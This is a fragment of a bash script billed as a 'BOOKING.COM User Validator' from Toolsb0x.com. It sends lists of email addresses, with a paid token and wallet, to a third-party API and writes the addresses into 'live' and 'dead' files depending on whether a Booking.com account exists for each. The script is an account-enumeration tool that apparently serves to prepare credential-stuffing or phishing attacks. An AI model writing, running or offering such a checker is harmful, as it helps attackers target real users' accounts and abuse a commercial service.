...
EOF
echo -e "=========================[ ${GINGIN}BOOKING.COM User Validator${WHITE} ]========================="

echo -e "${GREEN}BOOKING User Validator by Toolsb0x.com${WHITE}"
...
check(){
    cr=$(curl -s 'http://api.toolsb0x.com/api/booking.php?list='$email'&token='$YOURTOKEN'&wallet='$YOURWALLET'')
     if [[ $cr =~ '"status":"live"' ]]; then
        echo -e "[$2/$total] ${GREEN}BOOKING.COM LIVE => $email${WHITE} [ Toolsb0x.com - [$date]]"
        echo $email "[ Toolsb0x.com - [$date]]" >> Booking-live.txt
    elif [[ $cr =~ '"status":"die"' ]]; then
        echo -e "[$2/$total] ${RED}BOOKING.COM DIE => $email${WHITE}"
        echo $email >> Booking-dead.txt
